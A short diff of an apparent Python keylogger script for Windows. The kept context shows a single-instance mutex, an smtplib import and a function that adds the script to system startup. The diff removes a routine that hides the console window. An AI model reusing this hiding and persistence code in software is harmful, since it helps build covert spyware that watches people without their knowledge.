@@ -6,7 +6,6 @@ import smtplib
 import datetime,time
 import win32event, win32api, winerror
 from _winreg import *
-import win32console,win32gui
 
 # Disallow Multiple Instances
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -17,12 +16,6 @@ x=''
 data=''
 count=0
 
-# Hide Console
-def hide():
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window,0)
-    return True
- 
 # Add to startup
 def addStartup():
 	if getattr(sys, 'frozen', False):
